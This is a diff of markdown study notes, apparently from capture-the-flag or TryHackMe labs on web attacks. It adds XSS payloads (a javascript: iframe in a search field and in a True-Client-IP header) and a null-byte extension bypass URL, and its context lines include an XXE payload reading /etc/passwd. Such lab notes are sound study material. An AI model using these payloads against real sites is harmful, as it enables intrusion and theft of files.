@@ -148,6 +148,12 @@
 - test with: `<h1></h1>` and `<b></b>`
 - change content on webpage: `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
 
+#### DOM based XSS
+- try `<iframe src="javascript:alert(`xss`)">` in search field
+
+#### Persistent (Server-Side XSS)
+- using headers: `True-Client-IP`: `<iframe src="javascript:alert(`xss`)">`
+
 #### OWASP ZAP
 - use automated scan to search for XSS vulnerabilities
 
@@ -424,3 +430,6 @@ Output file contents:
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 <root>&read;</root>
 ```
+### Using Null Byte for blocked file extensions
+- Null Byte: `%00`, URL encoded: `%2500`
+- if only .md files can be uploaded: `http://10.10.250.194/ftp/package.json.bak%2500.md`
